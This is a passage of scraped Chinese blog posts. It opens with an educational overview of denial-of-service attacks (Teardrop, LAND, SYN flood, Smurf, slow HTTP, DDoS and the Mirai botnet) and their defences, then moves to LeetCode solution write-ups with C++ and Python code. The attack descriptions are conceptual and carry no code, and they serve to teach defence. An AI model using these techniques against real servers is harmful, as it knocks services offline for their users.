0时才允许将一个数据报分片。若DF = 1且数据报大小大于链路层的MTU，只能丢弃并发送ICMP错误信息。 片偏移占13位。既然一个数据报能被分成好几个小片，那么每个小片需要记录自己在原始数据报中的位置，否则怎么重组呢？片偏移的单位是8B，也就意味着除了最后一个片外，每个片中的有效载荷都是8的倍数（字节）。\nTeardrop 该攻击的原理是向目标主机发送一些分片的IP报文，并故意将片偏移字段设置成错误的值（与上一片重叠或错开）。某些操作系统在处理这类分片的时候会出现系统崩溃、重启等现象。\n这里主要以重叠为例。重叠是指第二片IP包的偏移量小于第一片的尾部，且算上第二片的长度也没有超过第一片的尾部。我认为更加准确的描述应该是IP分片的镶嵌，如下所示：\n分片重叠（镶嵌） 这时，我们要求第二个分片的长度，如果使用len2 = end2 - end1来计算，就产生了一个负值。\n如果进一步使用memcpy(ip_package_start_addr + offset2, buffer, len2)来将第二个分片从缓冲区拷贝到重组IP包中，由于长度是一个负值，也就相当于一个unsigned的超大正值，就产生了溢出。\n就我个人来说，其实还没有想清楚为什么要使用end2 - end1的办法来计算len2，明明长度字段就写在报头\u0026hellip;\n不过如果报头的长度字段也被伪造了，怎么办呢？Teardrop的防御办法是将接受到的数据报先缓存起来，然后先根据标识分组来进行检查，对于分片信息有错误的报文就直接丢弃。\n不过，还是简单一点，没有什么是一个补丁无法解决的，如果有，那就两个。😤\nLAND攻击 在TCP连接管理中，源地址、目的地址、源端口、目的端口是最为重要的几个参数。如果交由你来实现TCP连接监听，是否会向一个SYN包中的源IP直接发起ACK应答呢？\nLAND攻击采用了特别构造的SYN包，其源地址和目的地址都被设置为目标服务器的地址。此举将导致接受服务器向它自己的地址发送一个SYN-ACK消息（第二次握手），然后再返回一次ACK消息（第三次握手），创建一个回环的空连接并保留下来，直到超时。\n现在，大多数防火墙都能拦截类似的攻击包以保护系统。部分操作系统也通过安全补丁修复了这一漏洞。此外，路由器应同时配置上行和下行筛选器，屏蔽所有源地址与目的地址相同的数据包。\nSYN FLOOD 还是SYN！\n在TCP连接管理中，建立连接需要三次握手，如果你对此不太熟悉，可以看看我对TCP知识点的整理。\nTCP连接的第二次握手，即服务器收到一个SYN包之后，如果同意连接，便返回一个SYN-ACK应答，并在此步分配TCP连接资源（如在内存中开辟缓冲区等）。\n而此时客户机还没有完成第三次握手，客户机资源还没有分配，故此时的连接称为半开连接。\n这种半开连接的数量是有限制的（废话），当服务器的连接资源被耗尽后，就不能再接受其他的TCP连接请求了。\n所以，猥琐的Attackers在短时间内构造大量的SYN包，但就是不完成第三次握手，使得客户机资源几乎没有受到影响，但服务器资源被快速耗尽，造成拒绝服务的效果。\n受到SYN FLOOD影响的系统有很多！这主要是由于这种攻击的几个细节：\n连接请求是正常的（所以不好防），但是源IP地址往往是伪造的，并且是一台不可达的机器，否则被伪造的机器会重置这些半开连接； 半开连接也是有超时限制的，所以发送SYN包的速度要远大于服务器清除半开连接的速度； 任何连接到Internet上并提供基于TCP的网络服务，都能成为攻击目标； 这种攻击很难追踪！因为源地址往往不可信且不在线。 对于SYN FLOOD的防御，最常见的就是使用一个代理来接收TCP请求。这类代理可以通过真实客户端和伪造客户端的行为差异来对连接进行清洗，且由于代理的工作是单一的，能够进行硬件和操作系统TCP/IP协议栈的特别优化，或者开辟巨大的半开连接队列，具有较好的韧性。采用一系列策略（如Cookie源认证、reset认证，见参考资料8）确定对方连接的可用性之后，可以将源IP加入白名单，使其之后可以直连服务器；或者由代理向服务器发起连接，进行数据转发。\n此外，在主机层面可以延缓TCP连接资源的分配。如SYN Cache技术：先完成第二次握手，但是并不立即分配资源，而是在一个专用Cache中保存这个半开连接的信息，直到收到正确的ACK再分配资源。\nSmurf Smurf攻击是一种病毒攻击，以最初发动这种攻击的程序“Smurf”来命名。这种攻击方法结合使用了IP欺骗和ICMP回复的办法，使得大量流量涌向目标网络或系统，造成拒绝服务的效果。\n攻击者向一个具有大量主机和因特网连接的广播地址发送ICMP Echo请求，并用受害者的IP作为源地址；广播上的每台机器响应这些Echo请求，同时向受害者发送ICMP Echo-Reply应答；受害主机会被这些大量的应答包淹没。\nSmurf 这种攻击已经很少见，大多数的网络已经对这种攻击免疫了。挫败一个Smurf攻击的最简单的方法就让路由器在收到向一个广播地址的ICMP Echo信息时丢弃它。\nHTTP Flood 常见的服务器在处理对某些URI的访问时需要消耗计算资源或系统资源，如果攻击者通过代理或僵尸主机向目标URI进行大量HTTP请求，将造成服务器资源的耗尽。以最典型的HTTP GET请求为例，针对服务器上某个文件进行快速的反复的读取，能造成服务器资源的减少；除了Web服务器之外，大量的HTTP请求可能产生大量的数据库查询，可以在几秒内使数据库停止响应。\n你应该会对这类攻击产生一种熟悉感，HTTP FLOOD和SYN FLOOD不是有点相似么？是的，其防御手段也相去不远。\nSYN FLOOD可以借助TCP代理来管理连接，而HTTP FLOOD也可以借助HTTP代理来解析HTTP请求。TCP代理通过Cookie源认证、reset认证等手段来甄别恶意程序和正常客户端，而HTTP的代理可以利用重定向、验证码等手段来甄别僵尸主机和正常客户端；除此之外，当目的IP流量触发警告阈值时，这样的代理可以对HTTP的源IP流量进行统计，对某个异常源流量进行限速；此外，代理还能监控源IP对某个URI的访问，当某个源主机短时间集中访问计算资源多的URL时，可以将其加入动态黑名单。\nHTTP 慢速攻击 2012年的OWASP大会上，由Wong Onn Chee和Tom Brennan共同演示。\n该攻击的基本原理是对HTTP服务器建立一个连接，指定一个比较大的content-length，然后以非常低的速度发包，维持住这个连接不断开。\n显然，如果客户端不断地建立这种连接，服务器的可用连接资源会被逐渐占满，导致拒绝服务。而在客户端使用单线程方式建立较大数量的无用连接的代价非常低廉，使得这类攻击的成本也较低。\nHTTP慢速攻击主要根据HTTP协议的内容分成三类：\nSlow Headers。Web应用在处理HTTP请求之前要先接收完所有的HTTP头部，因为头部中包含了一些可能用到的重要信息。攻击者利用这点建立HTTP连接，保持慢速发送HTTP头部，且一直不发送头部终止符（两个连续的\\r\\n），这样服务器就认为对方的头部还没有发完，一直维持连接，占用资源。 Slow Body。攻击者发送一个HTTP Post请求，该请求的content-length很大，使得服务器误以为对方要发送很大的数据。但是客户端每次只发少量数据，使该连接一直保活。 Slow Read。客户端与服务器建立连接并发送一个HTTP请求，客户端发送完整的请求给服务端，收到回应后一直保持这个连接，以很低的速度读取Response。比如客户端很长一段时间不读取任何数据，通过发送Zero Window到服务器，让服务器误以为客户端很忙，直到连接快超时之前才读取一个字节，以消耗服务器的连接资源。 防御此类攻击的最简单办法就是设置一个超时时间和最小速率。如果客户端不能在配置时间发送完头部或body数据，服务器会返回一个408 REQUEST_TIME_OUT错误；如果客户端不能在指定时间内接受完数据，也会引发超时。\n这样的防御措施实际上在网络条件不好的情况下会误伤正常用户，比如从中国大陆下载国外服务器上的大文件时，可能引发超时。\nDDoS 分布式拒绝服务攻击（Distributed Denial of Service），是DoS攻击的改进版本。传统的DoS攻击是一对一的攻击，这在算力飞涨的今天已经效果较差了。\n所谓分布式，就是控制大量的主机同时发动DoS攻击（如SYN FLOOD），规模越大，则流量成倍地上升，效果非常强悍。\nCC攻击（Challenge Collapsar） CC攻击的原理就是攻击者控制某些主机不停地发大量数据包给对方服务器造成服务器资源耗尽，一直到宕机崩溃。这类攻击具有真实性高、检测困难、防御困难的特点。\n在物联网快速发展的时代，物联网设备的安全却刚刚起步。许多IoT设备使用默认密码，且被控制之后往往没有任何症状，这使得IoT设备成为了发动DDoS攻击的理想肉鸡。世界上最大的僵尸网络Mirai就包含大量的物联网设备，它们曾发起大规模的分布式拒绝服务攻击，导致美国东海岸大面积断网。\n篇幅有限，对于DoS的检测就不详细展开了。目前，常见的DoS检测是基于异常的检测，即通过监视审计系统记录系统上的异常情况。比如当日志记录到某一时段爆发大量的流量，超出了平时的统计阈值时，可能表示此时段系统受到了DoS攻击。\n参考资料 [1] 百度百科.ping（网络诊断工具）[EB/OL]\nhttps://baike.baidu.com/item/ping/6235\n[2] 百度百科.ICMP[EB/OL]\nhttps://baike.baidu.com/item/ICMP/572452\n[3] 百度百科.Ping of Death[EB/OL]\nhttps://baike.baidu.com/item/Ping%20of%20Death\n[4] 小白教程.死亡之ping的工作原理以及如何预防[EB/OL]\nhttps://www.schoolw3c.com/ping-of-death/\n[5] 王道论坛.2021年计算机网络考研复习指导[M].北京:电子工业出版社,2020:147-157\n[6] 孤君.IP首部[EB/OL].2019-03-17\nhttps://blog.csdn.net/Wu000999/article/details/88617237\n[7] 快快网络.什么是Teardrop攻击？我们要如何防御Teardrop攻击？[EB/OL].2019-03-13\nhttps://www.jianshu.com/p/3ac57cfb3743\n[8] 一只IT小小鸟.DDoS攻击\u0026ndash;Syn_Flood攻击防护详解（TCP）[EB/OL].2018-08-22\nhttps://blog.csdn.net/qq_34777600/article/details/81946514\n[9] Java.Sheng.SYN Flood原理及防护[EB/OL].2016-04-16\nhttps://blog.csdn.net/woaigaolaoshi/article/details/51166340\n[10] 百度百科.land攻击[EB/OL]\nhttps://baike.baidu.com/item/land%E6%94%BB%E5%87%BB/4759470?fr=aladdin\n[11] 百度百科.Smurf攻击[EB/OL]\nhttps://baike.baidu.com/item/Smurf%E6%94%BB%E5%87%BB/9112141?fr=aladdin\n[12] fcm.HTTP Flood攻击与防御原理[EB/OL].2015-10-19\nhttps://forum.huawei.com/enterprise/zh/thread-293931.html\n[13] 中国网科技.Mirai僵尸网络再作乱 360：物联网设备成隐私泄露重灾区[EB/OL].2020-12-07\nhttp://tech.china.com.cn/roll/20201207/372546.shtml\n[14] wpjamer.CC攻击原理及防范方法[EB/OL].2018-05-12\nhttps://www.cnblogs.com/wpjamer/p/9030259.html\n","date":"2021-02-02T00:00:00Z","permalink":"https://xrg.fj.cn/p/dos%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/","title":"DoS——拒绝服务攻击"},{"content":"美好的二月从WA一道简单题开始。\n题目链接：https://leetcode-cn.com/problems/fair-candy-swap/\n描述\n爱丽丝和鲍勃有不同大小的糖果棒：A[i] 是爱丽丝拥有的第 i 根糖果棒的大小，B[j] 是鲍勃拥有的第 j 根糖果棒的大小。\n因为他们是朋友，所以他们想交换一根糖果棒，这样交换后，他们都有相同的糖果总量。（一个人拥有的糖果总量是他们拥有的糖果棒大小的总和。）\n返回一个整数数组 ans，其中 ans[0] 是爱丽丝必须交换的糖果棒的大小，ans[1] 是 Bob 必须交换的糖果棒的大小。\n如果有多个答案，你可以返回其中任何一个。保证答案存在。\n示例1\n输入： A = [1,1], B = [2,2]\n输出：[1,2]\n示例2\n输入： A = [1,2], B = [2,3]\n输出：[1,2]\n数据范围\n1 \u0026lt;= A.length \u0026lt;= 10000 1 \u0026lt;= B.length \u0026lt;= 10000 1 \u0026lt;= A[i] \u0026lt;= 100000 1 \u0026lt;= B[i] \u0026lt;= 100000 保证爱丽丝与鲍勃的糖果总量不同。 答案肯定存在。 分析 希望满足交换后的总和相等，不难看出交换的数量需要满足一定的关系。\n我们设Allice拿来交换的大小是changeA，Bob拿来交换的大小是changeB；两人交换前分别具有sumA和sumB总量的糖果，则两人交换之后拥有的总量分别是：\nAllice：sumA - changeA + changeB Bob：sumB - changeB + changeA 两个式子是相等的，那么我们进行相减，得到sumA - sumB + 2changeB - 2changeA = 0；\n进一步使用diff来表示sumA - sumB，即初始总量之差，则对等式变形能得到：changeA = changeB + diff / 2。\n这就是我们最终使用的公式，changeA和changeB满足的关系。\n暴力 我们可以循环Allice的每一个糖果棒，即对于每一个changeA，只需要使用公式计算changeB，然后判断changeB是否存在于Bob的集合中；当我们找到了一对changeA和changeB同时存在，就是最终的答案。\n则转化成为一个搜索问题，对于一个特定的changeB，在Bob的集合中查找它是否存在。\n使用顺序搜索，一层循环changeA，每个changeA还需要遍历一次Bob的集合，复杂度是O(n^2)，显然不行；\n使用二分搜索，一层循环changeA，每个changeA搜索对应的changeB只需要花费logn，则总复杂度是O(nlogn)，可以一试。\n第一次WA，二分写错了\u0026hellip;\n暴力二分，AC代码： class Solution { public: typedef long long LL; const int INF = 0xffffff; int bSearch(int target, vector\u0026lt;int\u0026gt; v) { int left = 0; int right = v.size() - 1; int res = -INF; while (left \u0026lt;= right) { int mid = (left + right) / 2; if (v[mid] \u0026lt; target) // 答案在右半部分 { left = mid + 1; continue; } else if (v[mid] \u0026gt; target) // 答案在左半部分 { right = mid - 1; continue; } else { res = target; break; } } return res; // 没找到，-INF；找到，target } vector\u0026lt;int\u0026gt; fairCandySwap(vector\u0026lt;int\u0026gt;\u0026amp; A, vector\u0026lt;int\u0026gt;\u0026amp; B) { sort(A.begin(), A.end()); sort(B.begin(), B.end()); LL sum_a = 0; LL sum_b = 0; for (int i = 0; i \u0026lt; A.size(); ++i) sum_a += A[i]; for (int i = 0; i \u0026lt; B.size(); ++i) sum_b += B[i]; LL diff = sum_a - sum_b; int change_a, change_b; // change_a = change_b + diff / 2 vector\u0026lt;int\u0026gt; res; for (int i = 0; i \u0026lt; A.size(); ++i) { change_a = A[i]; change_b = change_a - diff / 2; // cout \u0026lt;\u0026lt; change_a \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; change_b \u0026lt;\u0026lt; endl; if(bSearch(change_b, B) != -INF) // 找到 { res.push_back(change_a); res.push_back(change_b); break; } } return res; } }; 对于一个vector进行二分查找，初始化right = v.size() - 1，第一次WA的时候没有减一；\nwhile循环，判断条件应该是left \u0026lt;= right，第一次WA的时候也没有等号。\n二分还是细啊o(╥﹏╥)o\n不过表现就烂成蛇皮了。\nPerformance 1 双指针 在查找changeA和changeB的时候是否存在O(n) 的办法呢？是存在的。\n假设Allice和Bob的集合都已经从小到大排好序，使用一个pA指向Allice的集合起始元素，pB指向Bob的集合起始元素，用如下规则进行移动：\n当*pA \u0026gt; *pB + diff / 2的时候，pB++； 当*pA \u0026lt; *pB + diff / 2的时候，pA++； 两者相等的时候，就是我们要的答案。 此法的正确性主要来自于集合的有序性。第一种情况出现时，说明pB指向的元素太小了，changeB需要再大一点，故将pB向后移动；当第二种情况出现的时候，说明pA指向的元素太小了，changeA需要再大一点。\n二分和双指针法的最大复杂度其实都是O(nlogn)（排序），但是在查找过程中显然双指针更快一些。\nAC代码： class Solution { public: typedef long long LL; vector\u0026lt;int\u0026gt; fairCandySwap(vector\u0026lt;int\u0026gt;\u0026amp; A, vector\u0026lt;int\u0026gt;\u0026amp; B) { sort(A.begin(), A.end()); sort(B.begin(), B.end()); LL sum_a = 0; LL sum_b = 0; for (int i = 0; i \u0026lt; A.size(); ++i) sum_a += A[i]; for (int i = 0; i \u0026lt; B.size(); ++i) sum_b += B[i]; LL diff = sum_a - sum_b; vector\u0026lt;int\u0026gt; res; vector\u0026lt;int\u0026gt;::iterator pA = A.begin(); vector\u0026lt;int\u0026gt;::iterator pB = B.begin(); while (pA != A.end() \u0026amp;\u0026amp; pB != B.end()) { if (*pA \u0026gt; *pB + diff / 2) // pB指向的目标太小 { pB++; } else if (*pA \u0026lt; *pB + diff / 2) // pA指向的目标太小 { pA++; } else { res.push_back(*pA); res.push_back(*pB); break; } } return res; } }; 表现还不错。\nPerformance 2 官方题解中提到的哈希表，在最开始构思的时候就想到了，但是懒得再查STL的用法，故放弃。\n题解中有个老哥与我的双指针方法一毛一样，但是我的做法是独立想出来的，故不将其放入参考资料中。\n参考资料 [1] 力扣官方题解.公平的糖果交换[EB/OL].2021-02-01\nhttps://leetcode-cn.com/problems/fair-candy-swap/solution/gong-ping-de-tang-guo-jiao-huan-by-leetc-tlam/\n","date":"2021-02-01T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode888.-%E5%85%AC%E5%B9%B3%E7%9A%84%E7%B3%96%E6%9E%9C%E6%A3%92%E4%BA%A4%E6%8D%A2/","title":"错题本 | LeetCode888. 公平的糖果棒交换"},{"content":"我的第一次LeetCode周赛，本来大有希望AC三道题，结果在这个神坑上趴了半个多小时o(╥﹏╥)o\n题目链接：https://leetcode-cn.com/problems/can-you-eat-your-favorite-candy-on-your-favorite-day/\n题目 给你一个下标从 0 开始的正整数数组 candiesCount ，其中 candiesCount[i] 表示你拥有的第 i 类糖果的数目。同时给你一个二维数组 queries ，其中 queries[i] = [favoriteTypei, favoriteDayi, dailyCapi] 。\n你按照如下规则进行一场游戏：\n你从第 0 天开始吃糖果。 你在吃完 所有 第 i - 1 类糖果之前，不能 吃任何一颗第 i 类糖果。 在吃完所有糖果之前，你必须每天 至少 吃 一颗 糖果。 请你构建一个布尔型数组 answer ，满足 answer.length == queries.length 。answer[i] 为 true 的条件是：在每天吃 不超过 dailyCapi 颗糖果的前提下，你可以在第 favoriteDayi 天吃到第favoriteTypei类糖果；否则 answer[i] 为 false 。注意，只要满足上面 3 条规则中的第二条规则，你就可以在同一天吃不同类型的糖果。\n请你返回得到的数组 answer 。\n示例1\n输入：candiesCount = [7,4,5,3,8], queries = [[0,2,2],[4,2,4],[2,13,1000000000]]\n输出：[true,false,true]\n示例2\n输入：candiesCount = [5,2,6,4,1], queries = [[3,1,2],[4,10,3],[3,10,100],[4,100,30],[1,3,1]]\n输出：[false,true,true,false,false]\n数据范围\n1 \u0026lt;= candiesCount.length \u0026lt;= 105 1 \u0026lt;= candiesCount[i] \u0026lt;= 105 1 \u0026lt;= queries.length \u0026lt;= 105 queries[i].length == 3 0 \u0026lt;= favoriteTypei \u0026lt; candiesCount.length 0 \u0026lt;= favoriteDayi \u0026lt;= 109 1 \u0026lt;= dailyCapi \u0026lt;= 109 分析 弯弯绕绕的规则，实际上就是在问：从头开始吃，能不能在第favDay天吃到favType这种糖果。\n由于从第0天开始吃，所以在favDay这一天的时候，前面一共也已经吃了favDay天。\n这么多天里，最多能吃掉多少糖果，最少能吃掉多少糖果呢？非常简单：\n每个query里面给出了每天最多能吃多少糖果，我的程序中记做dayCap；\n每天敞开了吃，不算favDay这一天，最多吃掉favDat * dayCap的糖果，算上这一天结束，能吃掉(favDay + 1) * dayCap的糖果；\n每天省着吃，但是规定至少需要吃掉一颗。不算favDay这一天，最少也得吃掉favDay的糖果。\n由于从前往后吃，所以在favDay这一天能不能吃到favType这类糖果，就转化为了favType之前的所有糖果的数量和与上面这两个数值的关系。吃不到糖果只有两种可能，太多与太少：\n当我们敞开了吃，结果在favDay这一天结束的时候都没办法吃到第favType类糖果，这是由于它前面类型的糖果数量太多了； 当我们省着吃，结果在favDay这一天之前就已经把favType类糖果吃完了，这是由于它前面类型的糖果数量太少了； 使用前缀和数组保存favType之前的糖果数量和，prefix_sum[i]表示第i类糖果之前的糖果和（不包括第i类）。\nAC代码 class Solution: def canEat(self, candiesCount: List[int], queries: List[List[int]]) -\u0026gt; List[bool]: res = [] prefix_sum = [0] for i in range(1, len(candiesCount) + 1): prefix_sum.append(prefix_sum[-1] + candiesCount[i - 1]) # print(len(prefix_sum)) for q in queries: favType = q[0] favDay = q[1] dayCap = q[2] # 敞开了吃，都不能在favDay结束的时候把前面的糖果吃完 # 这里需要算上favDay，一共吃favDay + 1天 if (favDay + 1) * dayCap \u0026lt;= prefix_sum[favType]: res.append(False) continue # 省着吃，在favDay之前就已经把favType吃完 if favDay \u0026gt;= prefix_sum[favType + 1]: res.append(False) continue res.append(True) return res class Solution { public: typedef long long LL; vector\u0026lt;bool\u0026gt; canEat(vector\u0026lt;int\u0026gt;\u0026amp; candiesCount, vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; queries) { LL prefix_sum[100010] = { 0 }; // prefix_sum[i]: candiesCount[0]加到candiesCount[i - 1] bool check = false; for (int i = 1; i \u0026lt;= candiesCount.size(); ++i) { prefix_sum[i] = prefix_sum[i - 1] + candiesCount[i - 1]; // cout \u0026lt;\u0026lt; \u0026#34;i = \u0026#34; \u0026lt;\u0026lt; i \u0026lt;\u0026lt; \u0026#34;: \u0026#34; \u0026lt;\u0026lt; prefix_sum[i] \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } LL favDay, favType, dayCap; vector\u0026lt;bool\u0026gt; res; for (auto t : queries) { favDay = t[1]; favType = t[0]; dayCap = t[2]; // 第favDay之前，一共吃了favDay天 // 每天开足马力吃，都吃不完前面的 // prefix_sum[favType] = candiesCount[0] 加到 candiesCount[favType - 1] // 即开始吃favType之前的糖果总和 if ((favDay + 1) * dayCap \u0026lt;= prefix_sum[favType]) { res.push_back(false); continue; } // 每天省着吃，都吃不够 if (favDay \u0026gt;= prefix_sum[favType + 1]) { res.push_back(false); continue; } res.push_back(true); } return res; } }; 数据层面，我看讨论区讲的最多的是int存不下的坑，其实这道题从看到数据的第一眼开始就应该选择使用long或long long，大佬们的低级错误啊~\n然后是从第0天开始吃的问题，加粗也拯救不了眼瞎\u0026hellip;\n之前WA了几次，还是逻辑上的错误，没有考虑到favDay这一天也是能吃的，所以最大数量少算了一天；就这还能过61/62，测试数据有点弱。\n关键测试组：\nInput: [46,5,47,48,43,34,15,26,11,25,41,47,15,25,16,50,32,42,32,21,36,34,50,45,46,15,46,38,50,12,3,26,26,16,23,1,4,48,47,\n32,47,16,33,23,38,2,19,50,6,19,29,3,27,12,6,22,33,28,7,10,12,8,13,24,21,38,43,26,35,18,34,3,14,48,50,34,38,4,50,26,\n5,35,11,2,35,9,11,31,36,20,21,37,18,34,34,10,21,8,5]\n[[85,54,42]]\nOutput: true\n","date":"2021-01-31T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode5667.-%E4%BD%A0%E8%83%BD%E5%9C%A8%E4%BD%A0%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E9%82%A3%E5%A4%A9%E5%90%83%E5%88%B0%E4%BD%A0%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E7%B3%96%E6%9E%9C%E5%90%97/","title":"难题本 | LeetCode5667. 你能在你最喜欢的那天吃到你最喜欢的糖果吗？"},{"content":"题目链接：https://leetcode-cn.com/problems/swim-in-rising-water/\n又是一道不错的复习题，借此回顾回顾BFS和SPFA。\nBFS Breadth First Search，宽度优先搜素。\n已知图G = (V, E)和一个源顶点s，宽度优先搜索以一种系统的方式探寻G的边，从而“发现”s所能到达的所有顶点，并计算s到所有这些点的距离（最少边数）。\n使用一个数组visited维护每个顶点先前是否被访问过；使用一个数组dist维护源点到每个顶点的距离。visited初始化为全0，dist初始化为全正无穷。\n使用一个队列q维护当前正在访问的点，每次从队首中取出head来进行操作。对于head的邻接点tmp，若我们之前没有访问过它，则源点到它的距离就是源点到head的距离加1。我们记dist[tmp] = dist[head] + 1，然后将tmp放入队列q中，之后的某个时刻，tmp会被取出，然后继续找出与它邻接且没被访问过的点，直到队列为空，所有可达的点都被访问过了。\nBFS搜索的方法就像那荡开的涟漪，从源点开始不断向外扩张，最终遍历结束，涟漪消散。\n使用当年蹭HDU数据结构课的一道作业来进行BFS的回顾：\n题目描述\n一个迷宫由R行C列格子组成，有的格子里有障碍物，不能走；有的格子是空地，可以走。 给定一个迷宫，求从左上角走到右下角最少需要走多少步(数据保证一定能走到)。只能在水平方向或垂直方向走，不能斜着走。\n输入格式\n第一行是两个整数，Ｒ和Ｃ，代表迷宫的长和宽。（ 1\u0026lt;= R，C \u0026lt;= 40) 接下来是Ｒ行，每行Ｃ个字符，代表整个迷宫。 空地格子用\u0026rsquo;.\u0026lsquo;表示，有障碍物的格子用\u0026rsquo;#\u0026lsquo;表示。 迷宫左上角和右下角都是\u0026rsquo;.\u0026rsquo;。\n输出格式\n输出从左上角走到右下角至少要经过多少步（即至少要经过多少个空地格子）。计算步数要包括终点,，不包括起点。如果不能到达右下角，输出“NO”.\n输入1：\n5 5\n..###\n#\u0026hellip;.\n#.#.#\n#.#.#\n#.#..\n输出1： 8\n这是一道宽搜模板题。从源点出发，向四个方向（上下左右）探寻邻接点，若邻接点合法（即没有越界）且该点不是障碍（\u0026rsquo;#\u0026rsquo;）且该点未被访问，则记录它到源点的距离。\n我一直不会证明宽搜的正确性，总觉得它理所当然，就直接放代码了：\n#include \u0026lt;queue\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;algorithm\u0026gt; #include \u0026lt;vector\u0026gt; using namespace std; typedef struct { int x, y; } Point; char graph[44][44]; int visited[44][44]; int dist[44][44]; int R, C; queue\u0026lt;Point\u0026gt; q; vector\u0026lt;pair\u0026lt;int, int\u0026gt;\u0026gt; dirs = { {0, 1}, {1, 0}, {0, -1}, {-1, 0} }; void bfs() { Point head; Point tmp; // 源点入队 tmp.x = tmp.y = 0; visited[0][0] = 1; dist[0][0] = 0; q.push(tmp); // 开始宽搜 while (!q.empty()) { head = q.front(); q.pop(); for (const auto [dirx, diry] : dirs) { tmp.x = head.x + dirx; tmp.y = head.y + diry; if ( 0 \u0026lt;= tmp.x \u0026amp;\u0026amp; tmp.x \u0026lt; R \u0026amp;\u0026amp; 0 \u0026lt;= tmp.y \u0026amp;\u0026amp; tmp.y \u0026lt; C \u0026amp;\u0026amp; graph[tmp.x][tmp.y] != \u0026#39;#\u0026#39; \u0026amp;\u0026amp; !visited[tmp.x][tmp.y] ) { dist[tmp.x][tmp.y] = dist[head.x][head.y] + 1; visited[tmp.x][tmp.y] = 1; q.push(tmp); } } } } int main() { cin \u0026gt;\u0026gt; R \u0026gt;\u0026gt; C; for (int i = 0; i \u0026lt; R; ++i) { for (int j = 0; j \u0026lt; C; ++j) { cin \u0026gt;\u0026gt; graph[i][j]; dist[i][j] = 0xffff; } } bfs(); if (dist[R - 1][C - 1] != 0xffff) { cout \u0026lt;\u0026lt; dist[R - 1][C - 1] \u0026lt;\u0026lt; endl; } else { cout \u0026lt;\u0026lt; \u0026#34;NO\\n\u0026#34;; } return 0; } SPFA 终于来到了正题。\nSPFA是求单源最短路径的一种算法，其思想与宽搜十分相近。实际上，我当年在完全没有接触此算法的情况下独立地将宽搜改写为了一个粗糙的SPFA，用它通过了一些求最短路的题目。由此可见，在理解宽搜的前提下理解SPFA是比较简单的。\n大概还是需要讨论讨论BFS的正确性：我们将当前节点的邻接节点加入队列，由于当前节点到源节点最短，则其邻接节点到源节点也最短。\n但是，BFS的“距离”实际上是指源节点到当前节点的“跳数”，也就是从源节点出发需要经过几个节点才能到达当前节点。这在一个带权图中是不适用的。考虑以下情况：\nBFS在带权图中不适用 我们从源点A出发，到达点E，使用BFS时，情况如下：\n队列初始只有点A，dist[B] ~ dist[E]都是正无穷，visited[B] ~ visited[E]都是0； 点A出队，考虑其所有邻接点B、C、D，设置dist[B] = 5; dist[C] = 3; dist[D] = 7，并逐一入队，现在队列中有B/C/D； 点B出队，考虑其所有邻接点E，设置dist[E] = dist[B] + edge[B][E] = 11;，将E入队，现在队列中有C/D/E； 点C出队，考虑其所有邻接点E，由于visited[E] = 1，不再进行更新； 点D出队，没有邻接点； 点E出队，没有邻接点； 结束。 可以看到，由BFS最短跳数得到的带权距离并不一定是最短的，而这主要是由于边权具备任意性。实际上，例如在计算机网络中进行路由选路时，路由跳数最少的那条路线也未必是时延最低的，与此例有异曲同工之妙。\n在上面的分析中，由visited带来的影响能否消除呢？答案是肯定的。既然可能出现跳数更多但权和更短的路径，那么我们在访问点E的时候考虑其dist[E]和dist[C] + edge[C][E]的大小，令其等于更小的那一个不就可以了吗？\n在本例中，这样做确实可以。当点C出队时考虑其邻接点E，由于dist[E] \u0026gt; dist[C] + edge[C][E]，我们将dist[E]的值更新为后者，即A到E的最短距离为7。\n但是，在一个更加复杂的图中，这样做就不完全正确了。考虑这个有向图：\n有向图 当我们经过了很多跳之后终于找到了一个到达点C的更短路径（A-\u0026gt;B-\u0026gt;D-\u0026gt;F-\u0026gt;G-\u0026gt;C)，发现它的邻接点E早在不知道什么时候就已经用路径A-\u0026gt;C-\u0026gt;E来计算距离了。\n兵来将挡，水来土掩。既然我使用更小的距离来更新某个点时，它的邻接点可能无法得到更新，那么我们干脆让它再次进入队列中，这样之后它从队列中被取出时将会重新更新所有邻接点；同理，被更新的邻接点再次进入队列中，去更新邻接点的邻接点\u0026hellip;\u0026hellip;\n没错，SPFA就是如此，且只有如此。\n回顾一下说了什么：\n修改BFS中的距离更新条件，不用visited作为判断标准，而用dist作为判断标准，只要dist更小，就对其进行更新； 每次更新了某个点的dist，把它重新入队，这样就能更新它的邻接点。 那么，visited数组就还是有用的：我们之前使用visited来保存访问过的点，BFS过程中遇到访问过的点就不再访问了；现在可以使用visited来保存一个点是否存在队列中，若是，我们更新它的dist的时候就不用入队，因为它本来就在队列里面。采用这个办法，每次一个点出队的时候就将对应的visited设置为0，为其提供再次入队的可能性。\n说了那么多，看看LeetCode778. 水位上升的泳池中游泳:\n在一个 N x N 的坐标方格 grid 中，每一个方格的值 grid[i][j] 表示在位置(i,j)的平台高度。\n现在开始下雨了。当时间为t时，此时雨水导致水池中任意位置的水位为t。你可以从一个平台游向四周相邻的任意一个平台，但是前提是此时水位必须同时淹没这两个平台。假定你可以瞬间移动无限距离，也就是默认在方格内部游动是不耗时的。当然，在你游泳的时候你必须待在坐标方格里面。\n你从坐标方格的左上平台 (0，0) 出发。最少耗时多久你才能到达坐标方格的右下平台 (N-1, N-1)？\n示例1\n输入: [[0,2],[1,3]]\n输出: 3\n解释: 时间为0时，你位于坐标方格的位置为 (0, 0)。 此时你不能游向任意方向，因为四个相邻方向平台的高度都大于当前时间为 0 时的水位。\n等时间到达 3 时，你才可以游向平台 (1, 1). 因为此时的水位是 3，坐标方格中的平台没有比水位 3 